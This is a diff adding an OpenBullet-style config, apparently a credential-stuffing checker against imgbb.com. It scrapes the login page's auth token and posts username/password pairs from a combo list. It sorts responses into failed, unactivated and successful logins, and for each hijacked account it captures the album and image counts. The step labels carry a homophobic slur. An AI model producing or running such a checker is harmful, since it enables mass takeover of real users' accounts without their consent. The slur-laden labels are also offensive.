@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "imgbb",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-04T10:06:22.1628968+00:00",
+  "AdditionalInfo": "",
+  "Author": "Black Panther",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#HomoSexualPantherGET REQUEST GET "https://imgbb.com/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#HomoSexualPantherHOMOSEXUAL PARSE "<SOURCE>" CSS "[name=auth_token]" "value" 0 -> VAR "HOMOSEXUAL" "" "" 
+#HomoSexualPantherHOMO FUNCTION Constant "<USER>" -> VAR "HOMO" 
+#HomoSexualPantherSEXUAL FUNCTION Constant "<USER>" -> VAR "SEXUAL" 
+#HomoSexualPantherPOST REQUEST POST "https://imgbb.com/login" AutoRedirect=TRUE 
+  CONTENT "auth_token=<HOMOSEXUAL>&login-subject=<HOMO>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#HomoSexualMINESWEEPER KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Wrong Username/Email password combination" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "activate your account" 
+  KEYCHAIN Success OR 
+    KEY "Sign out" 
+#HomoSexualPantherALBUMS PARSE "<SOURCE>" LR "data-text=\"album-count\">" "<" Recursive=FALSE -> CAP "albums" "" "" 
+#HomoSexualPantherIMAGES PARSE "<SOURCE>" LR "data-text=\"image-count\">" "<" Recursive=FALSE -> CAP "images" "" "" 
